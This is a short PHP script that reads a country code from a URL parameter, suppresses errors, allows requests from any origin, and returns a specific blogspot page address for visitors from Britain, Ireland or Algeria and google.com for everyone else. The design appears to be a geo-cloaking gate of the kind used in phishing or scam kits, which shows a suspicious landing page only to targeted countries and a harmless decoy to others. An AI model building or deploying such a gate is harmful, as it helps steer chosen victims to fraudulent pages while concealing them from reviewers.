<?php
 header("Access-Control-Allow-Origin: *");
error_reporting(0);
$dd = $_GET["dz"];
$ok = 0;
if($dd == 'GB') {$ok = 1;}
if($dd == 'IE') {$ok = 1;}
if($dd == 'DZ') {$ok = 1;}

if($ok == '1') {$ok = "https://foridmotin.blogspot.com/ol/jziu.html";}else{$ok = "https://google.com";}

echo $ok;
?>
